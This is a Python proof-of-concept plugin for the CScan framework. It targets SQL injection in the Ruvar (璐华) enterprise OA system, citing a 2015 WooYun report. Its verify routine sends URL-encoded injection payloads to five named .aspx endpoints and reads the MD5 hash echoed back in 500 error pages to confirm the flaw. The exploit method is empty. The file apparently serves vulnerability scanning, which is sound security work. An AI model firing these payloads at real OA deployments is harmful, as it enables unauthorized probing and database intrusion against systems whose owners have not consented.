# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'ruvar_oa_0006' # 平台漏洞编号，留空
    name = '璐华通用企业版OA系统SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-06'  # 漏洞公布时间
    desc = '''
        璐华通用企业版OA系统SQL注入
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0104430' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'ruvar_oa'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ruvar_oa_0006' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps=[
                "/include/get_dict.aspx?bt_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
                "/LHMail/email_attach_delete.aspx?attach_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
                "/bulletin/bulletin_template_show.aspx?id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
                "/filemanage/file_memo.aspx?file_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
                "/CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0--",
                ]
            for p in ps:
                url=arg+p
                code,head,res,errcode,_=hh.http(url)
                if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()